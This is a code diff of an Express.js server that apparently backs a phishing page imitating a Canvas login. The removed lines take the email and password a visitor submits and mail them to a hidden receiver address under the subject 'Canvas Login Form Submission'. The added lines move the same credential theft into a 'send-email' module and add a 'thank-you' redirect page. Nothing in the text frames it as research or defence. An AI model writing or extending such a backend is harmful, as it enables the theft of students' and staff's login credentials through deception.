@@ -1,39 +1,26 @@
-require("dotenv").config();
-const express = require("express");
-const bodyParser = require("body-parser");
-const nodemailer = require("nodemailer");
-const path = require("path");
+require('dotenv').config();
+const express = require('express');
+const path = require('path');
+const sendLogin = require('./send-email');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+app.use(express.static('public'));
+app.use(express.json());
+app.set('views', path.join(__dirname, 'views'));
+app.engine('html', require('ejs').renderFile);
 
-app.use(bodyParser.json());
-app.use(express.static("public"));
+app.get('/', (req, res) => res.render('index.html'));
+app.get('/thank-you', (req, res) => res.render('thank-you.html'));
 
-app.post("/send-email", async (req, res) => {
-  const { email, password } = req.body;
-  const transporter = nodemailer.createTransport({
-    service: "gmail", // or your provider
-    auth: {
-      user: process.env.EMAIL_USER,
-      pass: process.env.EMAIL_PASS
-    }
-  });
-
-  const mailOptions = {
-    from: process.env.EMAIL_USER,
-    to: process.env.RECEIVER_EMAIL,
-    subject: "Canvas Login Form Submission",
-    text: `Email: ${email}\nPassword: ${password}`
-  };
-
+app.post('/send-email', async (req, res) => {
   try {
-    await transporter.sendMail(mailOptions);
+    await sendLogin(req.body);
     res.sendStatus(200);
   } catch (err) {
-    console.error("Email error:", err);
+    console.error(err);
     res.sendStatus(500);
   }
 });
 
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
